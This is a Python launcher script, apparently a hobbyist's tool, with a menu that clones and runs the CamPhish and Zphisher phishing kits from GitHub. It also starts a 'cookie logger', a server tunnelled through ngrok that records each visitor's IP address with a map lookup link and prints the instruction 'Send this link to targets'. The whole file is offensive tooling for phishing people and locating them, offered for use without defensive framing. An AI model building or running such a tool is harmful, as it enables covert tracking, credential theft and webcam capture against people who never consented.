import os
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer

NGROK_PATH = r"C:\Users\gtw2k\Downloads\ngrok-v3-stable-windows-amd64\ngrok.exe"

def start_ngrok(port=8080):
    """Starts ngrok for the specified port."""
    try:
        print("\n[*] Starting ngrok...")
        ngrok_process = subprocess.Popen([NGROK_PATH, "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[*] ngrok started successfully.")
        return ngrok_process
    except Exception as e:
        print(f"[!] Error starting ngrok: {e}")
        return None

def get_ngrok_url():
    """Fetches the ngrok public URL."""
    try:
        import requests
        response = requests.get("http://localhost:4040/api/tunnels")
        response.raise_for_status()
        tunnels = response.json().get("tunnels", [])
        for tunnel in tunnels:
            if tunnel.get("proto") == "http":
                return tunnel.get("public_url")
    except Exception as e:
        print(f"[!] Error fetching ngrok URL: {e}")
    return None

def start_cookie_logger():
    """Starts a cookie logger on a local server and creates an ngrok tunnel."""
    print("\n[*] Starting Cookie Logger...")
    file_name = input("Enter the name of the file to log data (e.g., logs.txt): ").strip()
    if not file_name:
        print("[!] No file name provided. Exiting Cookie Logger.")
        return

    try:
        with open(file_name, "w") as f:
            f.write("IP Address, Location (Google Maps URL)\n")  # Add headers for the log file

        class LoggingHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                client_ip = self.client_address[0]
                location_url = f"https://www.google.com/maps?q={client_ip}"
                log_entry = f"{client_ip}, {location_url}\n"
                print(f"[+] Logged: {log_entry.strip()}")

                with open(file_name, "a") as log_file:
                    log_file.write(log_entry)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Logging complete. Check the file for details.")

        server = HTTPServer(("0.0.0.0", 8080), LoggingHandler)
        print(f"[*] Local server started on http://localhost:8080")

        ngrok_process = start_ngrok()
        if ngrok_process:
            ngrok_url = None
            print("[*] Waiting for ngrok public URL...")
            while not ngrok_url:
                ngrok_url = get_ngrok_url()

            print(f"[*] Public URL: {ngrok_url}")
            print(f"[*] Logs will be saved to: {file_name}")
            print(f"[*] Send this link to targets: {ngrok_url}")

        server.serve_forever()

    except Exception as e:
        print(f"[!] Error starting Cookie Logger: {e}")

def download_and_open_tool(tool_name, repo_url, directory):
    """Downloads the tool (if not already downloaded) and opens it."""
    try:
        if not os.path.exists(directory):
            print(f"\n[*] Cloning {tool_name} from {repo_url}...")
            subprocess.run(["git", "clone", repo_url], check=True)
            print(f"[*] {tool_name} downloaded successfully.")
        else:
            print(f"[*] {tool_name} is already downloaded.")

        # Change directory and open the tool
        os.chdir(directory)
        print(f"[*] Opening {tool_name}...")
        subprocess.run(["bash", "start.sh"], shell=True)
        os.chdir("..")  # Change back to the parent directory

    except Exception as e:
        print(f"[!] Error with {tool_name}: {e}")

def main():
    while True:
        print("\n" + "="*50)
        print("  Welcome to the Tool Selector! Choose an option:")
        print("="*50)
        print("1. Open CamPhish")
        print("2. Open Zphisher")
        print("3. Start Cookie Logger")
        print("0. Exit")
        print("="*50)

        choice = input("Enter your choice (0-3): ").strip()

        if choice == "1":
            download_and_open_tool("CamPhish", "https://github.com/techchipnet/CamPhish.git", "CamPhish")
        elif choice == "2":
            download_and_open_tool("Zphisher", "https://github.com/htr-tech/zphisher.git", "zphisher")
        elif choice == "3":
            start_cookie_logger()
        elif choice == "0":
            print("\n[*] Exiting. Goodbye!")
            break
        else:
            print("[!] Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
